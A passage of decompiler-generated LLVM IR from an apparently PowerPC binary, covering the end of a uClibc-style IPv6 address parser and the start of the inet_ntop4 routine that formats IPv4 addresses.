  %v1_1000eedc3036 = inttoptr i32 %v0_1000ee08 to i8*
  %v2_1000eedc3137 = load i8, i8* %v1_1000eedc3036, align 1
  %v3_1000eedc3238 = zext i8 %v2_1000eedc3137 to i32
  store i32 %v3_1000eedc3238, i32* %r3.global-to-local, align 4
  store i32 268496612, i32* @lr, align 4
  %v1_1000eee03339 = call i32 @__GI_tolower(i32 %v3_1000eedc3238)
  store i32 %v1_1000eee03339, i32* %r3.global-to-local, align 4
  store i32 %v1_1000eee03339, i32* @r30, align 4
  %v3_1000eee43440 = icmp eq i32 %v1_1000eee03339, 0
  br i1 %v3_1000eee43440, label %dec_label_pc_1000eeec, label %dec_label_pc_1000ee14.lr.ph

dec_label_pc_1000ee14:                            ; preds = %dec_label_pc_1000ee14.lr.ph, %dec_label_pc_1000eedc.backedge
  %v1_1000eee035 = phi i32 [ %v1_1000eee03341, %dec_label_pc_1000ee14.lr.ph ], [ %v1_1000eee0, %dec_label_pc_1000eedc.backedge ]
  store i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_10013958.683 to i32), i32* @r25, align 4
  %v0_1000ee20 = load i32, i32* @r29, align 4
  %v1_1000ee20 = add i32 %v0_1000ee20, 1
  store i32 %v1_1000ee20, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_10013958.683 to i32), i32* @r3, align 4
  store i32 268496428, i32* @lr, align 4
  %v3_1000ee28 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_10013958.683 to i32), i32 %v1_1000eee035)
  store i32 %v3_1000ee28, i32* %r3.global-to-local, align 4
  %v3_1000ee2c = icmp eq i32 %v3_1000ee28, 0
  br i1 %v3_1000ee2c, label %dec_label_pc_1000ee4c, label %dec_label_pc_1000ee34

dec_label_pc_1000ee34:                            ; preds = %dec_label_pc_1000ee14
  %v0_1000ee34 = load i32, i32* @r25, align 4
  %v2_1000ee34 = sub i32 %v3_1000ee28, %v0_1000ee34
  store i32 %v2_1000ee34, i32* %r0.global-to-local, align 4
  %v0_1000ee38 = load i32, i32* @r28, align 4
  %v1_1000ee38 = mul i32 %v0_1000ee38, 16
  store i32 %v1_1000ee38, i32* %r9.global-to-local, align 4
  %v2_1000ee3c = or i32 %v1_1000ee38, %v2_1000ee34
  store i32 %v2_1000ee3c, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_1000ee3c, 65536
  br i1 %tmp19, label %dec_label_pc_1000eed8, label %dec_label_pc_1000ef88

dec_label_pc_1000ee4c:                            ; preds = %dec_label_pc_1000ee14
  %v0_1000ee4c = load i32, i32* @r30, align 4
  %v3_1000ee4c = icmp eq i32 %v0_1000ee4c, 58
  br i1 %v3_1000ee4c, label %dec_label_pc_1000ee54, label %dec_label_pc_1000eea8

dec_label_pc_1000ee54:                            ; preds = %dec_label_pc_1000ee4c
  %v0_1000ee54 = load i32, i32* @r23, align 4
  %v3_1000ee54 = icmp eq i32 %v0_1000ee54, 0
  br i1 %v3_1000ee54, label %dec_label_pc_1000ee5c, label %dec_label_pc_1000ee70

dec_label_pc_1000ee5c:                            ; preds = %dec_label_pc_1000ee54
  %v0_1000ee5c = load i32, i32* @r24, align 4
  %v3_1000ee5c = icmp eq i32 %v0_1000ee5c, 0
  br i1 %v3_1000ee5c, label %dec_label_pc_1000ee64, label %dec_label_pc_1000ef88

dec_label_pc_1000ee64:                            ; preds = %dec_label_pc_1000ee5c
  %v0_1000ee64 = load i32, i32* @r31, align 4
  store i32 %v0_1000ee64, i32* @r24, align 4
  %v0_1000ee68 = load i32, i32* @r29, align 4
  store i32 %v0_1000ee68, i32* @r26, align 4
  br label %dec_label_pc_1000eedc.backedge

dec_label_pc_1000ee70:                            ; preds = %dec_label_pc_1000ee54
  %v0_1000ee70 = load i32, i32* @r29, align 4
  %v1_1000ee70 = inttoptr i32 %v0_1000ee70 to i8*
  %v2_1000ee70 = load i8, i8* %v1_1000ee70, align 1
  %v3_1000ee70 = zext i8 %v2_1000ee70 to i32
  store i32 %v3_1000ee70, i32* %r0.global-to-local, align 4
  %v3_1000ee74 = icmp eq i8 %v2_1000ee70, 0
  br i1 %v3_1000ee74, label %dec_label_pc_1000ef88, label %dec_label_pc_1000ee7c

dec_label_pc_1000ee7c:                            ; preds = %dec_label_pc_1000ee70
  %v0_1000ee7c = load i32, i32* @r31, align 4
  %v1_1000ee7c = add i32 %v0_1000ee7c, 2
  store i32 %v1_1000ee7c, i32* %r0.global-to-local, align 4
  %v1_1000ee80 = load i32, i32* @r27, align 4
  %v3_1000ee80 = icmp ugt i32 %v1_1000ee7c, %v1_1000ee80
  br i1 %v3_1000ee80, label %dec_label_pc_1000ef88, label %dec_label_pc_1000ee88

dec_label_pc_1000ee88:                            ; preds = %dec_label_pc_1000ee7c
  %v0_1000ee88 = load i32, i32* @r28, align 4
  %v1_1000ee88 = udiv i32 %v0_1000ee88, 256
  store i32 %v1_1000ee88, i32* %r0.global-to-local, align 4
  %v1_1000ee8c = trunc i32 %v0_1000ee88 to i8
  %v3_1000ee8c = add i32 %v0_1000ee7c, 1
  %v4_1000ee8c = inttoptr i32 %v3_1000ee8c to i8*
  store i8 %v1_1000ee8c, i8* %v4_1000ee8c, align 1
  %v0_1000ee90 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ee90 = trunc i32 %v0_1000ee90 to i8
  %v2_1000ee90 = load i32, i32* @r31, align 4
  %v3_1000ee90 = inttoptr i32 %v2_1000ee90 to i8*
  store i8 %v1_1000ee90, i8* %v3_1000ee90, align 1
  %v0_1000ee94 = load i32, i32* @r29, align 4
  store i32 %v0_1000ee94, i32* @r26, align 4
  %v0_1000ee98 = load i32, i32* @r31, align 4
  %v1_1000ee98 = add i32 %v0_1000ee98, 2
  store i32 %v1_1000ee98, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000eedc30 = inttoptr i32 %v0_1000ee94 to i8*
  %v2_1000eedc31 = load i8, i8* %v1_1000eedc30, align 1
  %v3_1000eedc32 = zext i8 %v2_1000eedc31 to i32
  store i32 %v3_1000eedc32, i32* %r3.global-to-local, align 4
  store i32 268496612, i32* @lr, align 4
  %v1_1000eee033 = call i32 @__GI_tolower(i32 %v3_1000eedc32)
  store i32 %v1_1000eee033, i32* %r3.global-to-local, align 4
  store i32 %v1_1000eee033, i32* @r30, align 4
  %v3_1000eee434 = icmp eq i32 %v1_1000eee033, 0
  br i1 %v3_1000eee434, label %dec_label_pc_1000eeec, label %dec_label_pc_1000ee14.lr.ph

dec_label_pc_1000ee14.lr.ph:                      ; preds = %dec_label_pc_1000ee08, %dec_label_pc_1000ee88
  %v1_1000eee03341 = phi i32 [ %v1_1000eee033, %dec_label_pc_1000ee88 ], [ %v1_1000eee03339, %dec_label_pc_1000ee08 ]
  br label %dec_label_pc_1000ee14

dec_label_pc_1000eea8:                            ; preds = %dec_label_pc_1000ee4c
  %v3_1000eea8 = icmp eq i32 %v0_1000ee4c, 46
  br i1 %v3_1000eea8, label %dec_label_pc_1000eeb0, label %dec_label_pc_1000ef88

dec_label_pc_1000eeb0:                            ; preds = %dec_label_pc_1000eea8
  %v0_1000eeb0 = load i32, i32* @r31, align 4
  %v1_1000eeb0 = add i32 %v0_1000eeb0, 4
  store i32 %v1_1000eeb0, i32* @r30, align 4
  %v1_1000eeb4 = load i32, i32* @r27, align 4
  %v3_1000eeb4 = icmp ugt i32 %v1_1000eeb0, %v1_1000eeb4
  br i1 %v3_1000eeb4, label %dec_label_pc_1000ef88, label %dec_label_pc_1000eebc

dec_label_pc_1000eebc:                            ; preds = %dec_label_pc_1000eeb0
  %v0_1000eec0 = load i32, i32* @r26, align 4
  store i32 %v0_1000eec0, i32* %r3.global-to-local, align 4
  store i32 268496584, i32* @lr, align 4
  %v3_1000eec4 = call i32 @inet_pton4(i32 %v0_1000eec0, i32 %v0_1000eeb0)
  store i32 %v3_1000eec4, i32* %r3.global-to-local, align 4
  %v0_1000eec8 = load i32, i32* @r30, align 4
  store i32 %v0_1000eec8, i32* @r31, align 4
  %v2_1000eecc = icmp sgt i32 %v3_1000eec4, 0
  br i1 %v2_1000eecc, label %dec_label_pc_1000ef10, label %dec_label_pc_1000ef88

dec_label_pc_1000eed8:                            ; preds = %dec_label_pc_1000ee34
  store i32 1, i32* @r23, align 4
  %v0_1000eedc.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000eedc.backedge

dec_label_pc_1000eedc.backedge:                   ; preds = %dec_label_pc_1000eed8, %dec_label_pc_1000ee64
  %v0_1000eedc.be = phi i32 [ %v0_1000eedc.pre.pre, %dec_label_pc_1000eed8 ], [ %v0_1000ee68, %dec_label_pc_1000ee64 ]
  %v1_1000eedc = inttoptr i32 %v0_1000eedc.be to i8*
  %v2_1000eedc = load i8, i8* %v1_1000eedc, align 1
  %v3_1000eedc = zext i8 %v2_1000eedc to i32
  store i32 %v3_1000eedc, i32* %r3.global-to-local, align 4
  store i32 268496612, i32* @lr, align 4
  %v1_1000eee0 = call i32 @__GI_tolower(i32 %v3_1000eedc)
  store i32 %v1_1000eee0, i32* %r3.global-to-local, align 4
  store i32 %v1_1000eee0, i32* @r30, align 4
  %v3_1000eee4 = icmp eq i32 %v1_1000eee0, 0
  br i1 %v3_1000eee4, label %dec_label_pc_1000eeec, label %dec_label_pc_1000ee14

dec_label_pc_1000eeec:                            ; preds = %dec_label_pc_1000eedc.backedge, %dec_label_pc_1000ee08, %dec_label_pc_1000ee88
  %v0_1000eeec = load i32, i32* @r23, align 4
  %v3_1000eeec = icmp eq i32 %v0_1000eeec, 0
  %v0_1000ef54.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000eeec, label %dec_label_pc_1000ef10, label %dec_label_pc_1000eef4

dec_label_pc_1000eef4:                            ; preds = %dec_label_pc_1000eeec
  %v1_1000eef4 = add i32 %v0_1000ef54.pre.pre, 2
  store i32 %v1_1000eef4, i32* %r0.global-to-local, align 4
  %v1_1000eef8 = load i32, i32* @r27, align 4
  %v3_1000eef8 = icmp ugt i32 %v1_1000eef4, %v1_1000eef8
  br i1 %v3_1000eef8, label %dec_label_pc_1000ef88, label %dec_label_pc_1000ef00

dec_label_pc_1000ef00:                            ; preds = %dec_label_pc_1000eef4
  %v0_1000ef00 = load i32, i32* @r28, align 4
  %v1_1000ef00 = udiv i32 %v0_1000ef00, 256
  store i32 %v1_1000ef00, i32* %r0.global-to-local, align 4
  %v1_1000ef04 = trunc i32 %v0_1000ef00 to i8
  %v3_1000ef04 = add i32 %v0_1000ef54.pre.pre, 1
  %v4_1000ef04 = inttoptr i32 %v3_1000ef04 to i8*
  store i8 %v1_1000ef04, i8* %v4_1000ef04, align 1
  %v0_1000ef08 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ef08 = trunc i32 %v0_1000ef08 to i8
  %v2_1000ef08 = load i32, i32* @r31, align 4
  %v3_1000ef08 = inttoptr i32 %v2_1000ef08 to i8*
  store i8 %v1_1000ef08, i8* %v3_1000ef08, align 1
  %v0_1000ef0c = load i32, i32* @r31, align 4
  %v1_1000ef0c = add i32 %v0_1000ef0c, 2
  store i32 %v1_1000ef0c, i32* @r31, align 4
  br label %dec_label_pc_1000ef10

dec_label_pc_1000ef10:                            ; preds = %dec_label_pc_1000eeec, %dec_label_pc_1000eebc, %dec_label_pc_1000ef00
  %v0_1000ef54.pre = phi i32 [ %v0_1000eec8, %dec_label_pc_1000eebc ], [ %v1_1000ef0c, %dec_label_pc_1000ef00 ], [ %v0_1000ef54.pre.pre, %dec_label_pc_1000eeec ]
  %v0_1000ef10 = load i32, i32* @r24, align 4
  %v3_1000ef10 = icmp eq i32 %v0_1000ef10, 0
  %v1_1000ef54.pre = load i32, i32* @r27, align 4
  %v4_1000ef54 = icmp eq i32 %v0_1000ef54.pre, %v1_1000ef54.pre
  br i1 %v3_1000ef10, label %dec_label_pc_1000ef54, label %dec_label_pc_1000ef18

dec_label_pc_1000ef18:                            ; preds = %dec_label_pc_1000ef10
  %v2_1000ef1c = sub i32 %v0_1000ef54.pre, %v0_1000ef10
  store i32 %v2_1000ef1c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v4_1000ef54, label %dec_label_pc_1000ef88, label %dec_label_pc_1000ef3c.preheader

dec_label_pc_1000ef3c.preheader:                  ; preds = %dec_label_pc_1000ef18
  %v3_1000ef3c24 = icmp slt i32 %v2_1000ef1c, 1
  %v2_1000ef4026 = add i32 %v2_1000ef1c, -1
  store i32 %v2_1000ef4026, i32* %r10.global-to-local, align 4
  %v2_1000ef4427 = add i32 %v1_1000ef54.pre, -1
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1000ef3c24, label %dec_label_pc_1000ef54.thread, label %dec_label_pc_1000ef30

dec_label_pc_1000ef30:                            ; preds = %dec_label_pc_1000ef3c.preheader, %dec_label_pc_1000ef30.dec_label_pc_1000ef30_crit_edge
  %v0_1000ef30 = phi i32 [ %v0_1000ef30.pre, %dec_label_pc_1000ef30.dec_label_pc_1000ef30_crit_edge ], [ %v0_1000ef10, %dec_label_pc_1000ef3c.preheader ]
  %v2_1000ef4429 = phi i32 [ %v2_1000ef44, %dec_label_pc_1000ef30.dec_label_pc_1000ef30_crit_edge ], [ %v2_1000ef4427, %dec_label_pc_1000ef3c.preheader ]
  %v2_1000ef4028 = phi i32 [ %v2_1000ef40, %dec_label_pc_1000ef30.dec_label_pc_1000ef30_crit_edge ], [ %v2_1000ef4026, %dec_label_pc_1000ef3c.preheader ]
  %v2_1000ef30 = add i32 %v0_1000ef30, %v2_1000ef4028
  %v3_1000ef30 = inttoptr i32 %v2_1000ef30 to i8*
  %v4_1000ef30 = load i8, i8* %v3_1000ef30, align 1
  %v5_1000ef30 = zext i8 %v4_1000ef30 to i32
  store i32 %v5_1000ef30, i32* %r0.global-to-local, align 4
  %v3_1000ef34 = inttoptr i32 %v2_1000ef4429 to i8*
  store i8 %v4_1000ef30, i8* %v3_1000ef34, align 1
  %v0_1000ef38 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000ef38 = load i32, i32* @r24, align 4
  %v2_1000ef38 = load i32, i32* %r10.global-to-local, align 4
  %v3_1000ef38 = trunc i32 %v0_1000ef38 to i8
  %v4_1000ef38 = add i32 %v2_1000ef38, %v1_1000ef38
  %v5_1000ef38 = inttoptr i32 %v4_1000ef38 to i8*
  store i8 %v3_1000ef38, i8* %v5_1000ef38, align 1
  %v0_1000ef3c.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ef3c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ef44.pre = load i32, i32* @r27, align 4
  %v3_1000ef3c = icmp slt i32 %v1_1000ef3c.pre, %v0_1000ef3c.pre
  %v2_1000ef40 = sub i32 %v1_1000ef3c.pre, %v0_1000ef3c.pre
  store i32 %v2_1000ef40, i32* %r10.global-to-local, align 4
  %v1_1000ef48 = add i32 %v0_1000ef3c.pre, 1
  store i32 %v1_1000ef48, i32* %r9.global-to-local, align 4
  br i1 %v3_1000ef3c, label %dec_label_pc_1000ef54.thread, label %dec_label_pc_1000ef30.dec_label_pc_1000ef30_crit_edge

dec_label_pc_1000ef30.dec_label_pc_1000ef30_crit_edge: ; preds = %dec_label_pc_1000ef30
  %v2_1000ef44 = sub i32 %v1_1000ef44.pre, %v0_1000ef3c.pre
  %v0_1000ef30.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_1000ef30

dec_label_pc_1000ef54.thread:                     ; preds = %dec_label_pc_1000ef30, %dec_label_pc_1000ef3c.preheader
  %v0_1000ef50.lcssa = phi i32 [ %v1_1000ef54.pre, %dec_label_pc_1000ef3c.preheader ], [ %v1_1000ef44.pre, %dec_label_pc_1000ef30 ]
  store i32 %v0_1000ef50.lcssa, i32* @r31, align 4
  br label %dec_label_pc_1000ef5c

dec_label_pc_1000ef54:                            ; preds = %dec_label_pc_1000ef10
  br i1 %v4_1000ef54, label %dec_label_pc_1000ef5c, label %dec_label_pc_1000ef88

dec_label_pc_1000ef5c:                            ; preds = %dec_label_pc_1000ef54.thread, %dec_label_pc_1000ef54
  %v0_1000ef5c = load i32, i32* @r22, align 4
  store i32 %v0_1000ef5c, i32* @r3, align 4
  store i32 %v2_1000edd8, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ef6c.684 to i32), i32* @lr, align 4
  %v0_1000ef68 = call i32 @memcpy()
  store i32 %v0_1000ef68, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ef8c

dec_label_pc_1000ef74:                            ; preds = %dec_label_pc_1000edb8
  %v0_1000ef74 = call i32 @__errno_location()
  store i32 %v0_1000ef74, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000ef80 = inttoptr i32 %v0_1000ef74 to i32*
  store i32 97, i32* %v2_1000ef80, align 4
  %v0_1000ef90.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ef8c

dec_label_pc_1000ef88:                            ; preds = %dec_label_pc_1000ee7c, %dec_label_pc_1000ee70, %dec_label_pc_1000ee34, %dec_label_pc_1000ee5c, %dec_label_pc_1000ef18, %dec_label_pc_1000eebc, %dec_label_pc_1000eea8, %dec_label_pc_1000ef54, %dec_label_pc_1000edfc, %dec_label_pc_1000eef4, %dec_label_pc_1000eeb0
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ef8c

dec_label_pc_1000ef8c:                            ; preds = %dec_label_pc_1000ef74, %dec_label_pc_1000ef5c, %dec_label_pc_1000edc4, %dec_label_pc_1000ef88
  %v0_1000ef90 = phi i32 [ %v0_1000ef90.pre, %dec_label_pc_1000ef74 ], [ 1, %dec_label_pc_1000ef5c ], [ %v3_1000edcc, %dec_label_pc_1000edc4 ], [ 0, %dec_label_pc_1000ef88 ]
  store i32 %v0_1000ed9c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000ef90, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ef90

; uselistorder directives
  uselistorder i32 %v0_1000ef90, { 1, 0 }
  uselistorder i32 %v2_1000ef40, { 1, 0 }
  uselistorder i32 %v0_1000ef3c.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_1000ef54, { 1, 0 }
  uselistorder i32 %v0_1000ef54.pre, { 1, 0 }
  uselistorder i32 %v0_1000ef00, { 1, 0 }
  uselistorder i32 %v0_1000ef54.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000eee0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000ee88, { 1, 0 }
  uselistorder i32 %v1_1000ee38, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 9, 10, 11, 12, 13, 6, 16, 14, 15, 2, 1, 5, 4, 3, 7, 17, 8, 18, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0 }
  uselistorder i32 58, { 4, 0, 1, 2, 3 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268496612, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef8c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000ef88, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_1000ef5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef30, { 1, 0 }
  uselistorder label %dec_label_pc_1000ef10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000eeec, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ee14.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1000ee14, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000effc.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_1000efa4 = load i32, i32* @lr, align 4
  store i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_1000efd0 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_1000efd0, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_1000efe0.687 to i32), i32* @lr, align 4
  %v3_1000efdc = call i32 @__GI_memset(i32 %v2_1000efd0, i32 0, i32 15)
  store i32 %v3_1000efdc, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_1000f0a02 = load i32, i32* @r1, align 4
  store i32 %v0_1000f0a02, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000effc

dec_label_pc_1000effc:                            ; preds = %dec_label_pc_1000f070.dec_label_pc_1000effc_crit_edge, %dec_label_pc_1000effc.lr.ph
  %v2_1000f01c = phi i32 [ %v2_1000f0a0, %dec_label_pc_1000f070.dec_label_pc_1000effc_crit_edge ], [ %v0_1000f0a02, %dec_label_pc_1000effc.lr.ph ]
  %v0_1000f010 = phi i32 [ %v0_1000f0a0, %dec_label_pc_1000f070.dec_label_pc_1000effc_crit_edge ], [ %v0_1000f0a02, %dec_label_pc_1000effc.lr.ph ]
  %v0_1000f000 = phi i32 [ %v1_1000f0a0, %dec_label_pc_1000f070.dec_label_pc_1000effc_crit_edge ], [ 0, %dec_label_pc_1000effc.lr.ph ]
  %v1_1000f008 = phi i32 [ %v1_1000effc.pre, %dec_label_pc_1000f070.dec_label_pc_1000effc_crit_edge ], [ 0, %dec_label_pc_1000effc.lr.ph ]
  %v0_1000effc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000effc = add i32 %v0_1000effc, %v1_1000f008
  %v3_1000effc = inttoptr i32 %v2_1000effc to i8*
  %v4_1000effc = load i8, i8* %v3_1000effc, align 1
  %v5_1000effc = zext i8 %v4_1000effc to i32
  store i32 %v5_1000effc, i32* %r10.global-to-local, align 4
  store i32 %v0_1000f000, i32* %r8.global-to-local, align 4
  %v1_1000f004 = add i32 %v0_1000f000, 1
  store i32 %v1_1000f004, i32* %r11.global-to-local, align 4
  store i32 %v2_1000effc, i32* %r3.global-to-local, align 4
  %v1_1000f00c = load i32, i32* @r28, align 4
  %v2_1000f00c = udiv i32 %v5_1000effc, %v1_1000f00c
  %v2_1000f010 = add i32 %v1_1000f004, %v0_1000f010
  store i32 %v2_1000f010, i32* %r6.global-to-local, align 4
  %v1_1000f014 = add nuw nsw i32 %v2_1000f00c, 48
  %v1_1000f018 = urem i32 %v1_1000f014, 256
  store i32 %v1_1000f018, i32* %r0.global-to-local, align 4
  %v1_1000f01c = trunc i32 %v1_1000f014 to i8
  %v3_1000f01c = add i32 %v2_1000f01c, 8
  %v4_1000f01c = inttoptr i32 %v3_1000f01c to i8*
  store i8 %v1_1000f01c, i8* %v4_1000f01c, align 1
  %v0_1000f020 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000f020 = icmp eq i32 %v0_1000f020, 48
  %v0_1000f028 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f028 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000f028 = udiv i32 %v0_1000f028, %v1_1000f028
  store i32 %v2_1000f028, i32* %r9.global-to-local, align 4
  br i1 %v3_1000f020, label %dec_label_pc_1000f028, label %dec_label_pc_1000f054

dec_label_pc_1000f028:                            ; preds = %dec_label_pc_1000effc
  %v2_1000f02c = udiv i32 %v2_1000f028, %v1_1000f028
  %tmp18 = mul i32 %v2_1000f02c, -10
  %v2_1000f034 = add i32 %v2_1000f028, 48
  %v1_1000f038 = add i32 %v2_1000f034, %tmp18
  store i32 %v1_1000f038, i32* %r9.global-to-local, align 4
  %v1_1000f03c = urem i32 %v1_1000f038, 256
  store i32 %v1_1000f03c, i32* %r0.global-to-local, align 4
  %v1_1000f040 = trunc i32 %v1_1000f038 to i8
  %v2_1000f040 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000f040 = add i32 %v2_1000f040, 8
  %v4_1000f040 = inttoptr i32 %v3_1000f040 to i8*
  store i8 %v1_1000f040, i8* %v4_1000f040, align 1
  %v0_1000f044 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000f044 = icmp eq i32 %v0_1000f044, 48
  br i1 %v3_1000f044, label %dec_label_pc_1000f070, label %dec_label_pc_1000f04c

dec_label_pc_1000f04c:                            ; preds = %dec_label_pc_1000f028
  %v0_1000f04c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000f04c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f070

dec_label_pc_1000f054:                            ; preds = %dec_label_pc_1000effc
  %v0_1000f058 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f058 = add i32 %v0_1000f058, 1
  store i32 %v1_1000f058, i32* %r8.global-to-local, align 4
  %v2_1000f05c = udiv i32 %v2_1000f028, %v1_1000f028
  %v1_1000f060 = mul i32 %v2_1000f05c, 10
  store i32 %v1_1000f060, i32* %r0.global-to-local, align 4
  %v2_1000f064 = sub i32 %v2_1000f028, %v1_1000f060
  %v1_1000f068 = add i32 %v2_1000f064, 48
  store i32 %v1_1000f068, i32* %r9.global-to-local, align 4
  %v1_1000f06c = trunc i32 %v1_1000f068 to i8
  %v2_1000f06c = load i32, i32* %r6.global-to-local, align 4
  %v3_1000f06c = add i32 %v2_1000f06c, 8
  %v4_1000f06c = inttoptr i32 %v3_1000f06c to i8*
  store i8 %v1_1000f06c, i8* %v4_1000f06c, align 1
  br label %dec_label_pc_1000f070

dec_label_pc_1000f070:                            ; preds = %dec_label_pc_1000f028, %dec_label_pc_1000f04c, %dec_label_pc_1000f054
  %v0_1000f070 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000f070 = inttoptr i32 %v0_1000f070 to i8*
  %v2_1000f070 = load i8, i8* %v1_1000f070, align 1
  %v3_1000f070 = zext i8 %v2_1000f070 to i32
  %v0_1000f074 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000f074 = add i32 %v0_1000f074, 1
  %v0_1000f078 = load i32, i32* @r1, align 4
  %v2_1000f078 = add i32 %v0_1000f078, %v0_1000f074
  store i32 %v2_1000f078, i32* %r10.global-to-local, align 4
  %v2_1000f07c = add i32 %v1_1000f074, %v0_1000f078
  store i32 %v2_1000f07c, i32* %r8.global-to-local, align 4
  %v1_1000f080 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000f080 = udiv i32 %v3_1000f070, %v1_1000f080
  %v1_1000f084 = add i32 %v0_1000f074, 2
  store i32 %v1_1000f084, i32* %r11.global-to-local, align 4
  %v0_1000f088 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000f088 = add i32 %v0_1000f088, 1
  store i32 %v1_1000f088, i32* %r4.global-to-local, align 4
  %v1_1000f08c = mul nuw nsw i32 %v2_1000f080, 10
  store i32 %v1_1000f08c, i32* %r0.global-to-local, align 4
  %v2_1000f090 = sub nsw i32 %v3_1000f070, %v1_1000f08c
  %v1_1000f094 = add nsw i32 %v2_1000f090, 48
  store i32 %v1_1000f094, i32* %r9.global-to-local, align 4
  %v1_1000f098 = trunc i32 %v1_1000f094 to i8
  %v3_1000f098 = add i32 %v2_1000f078, 8
  %v4_1000f098 = inttoptr i32 %v3_1000f098 to i8*
  store i8 %v1_1000f098, i8* %v4_1000f098, align 1
  %v0_1000f09c = load i32, i32* %r12.global-to-local, align 4
  %v1_1000f09c = trunc i32 %v0_1000f09c to i8
  %v2_1000f09c = load i32, i32* %r8.global-to-local, align 4
  %v3_1000f09c = add i32 %v2_1000f09c, 8
  %v4_1000f09c = inttoptr i32 %v3_1000f09c to i8*
  store i8 %v1_1000f09c, i8* %v4_1000f09c, align 1
  %v0_1000f0a0 = load i32, i32* @r1, align 4
  %v1_1000f0a0 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000f0a0 = add i32 %v1_1000f0a0, %v0_1000f0a0
  store i32 %v2_1000f0a0, i32* %r7.global-to-local, align 4
  %v0_1000f0a4 = load i32, i32* %ctr.global-to-local, align 4
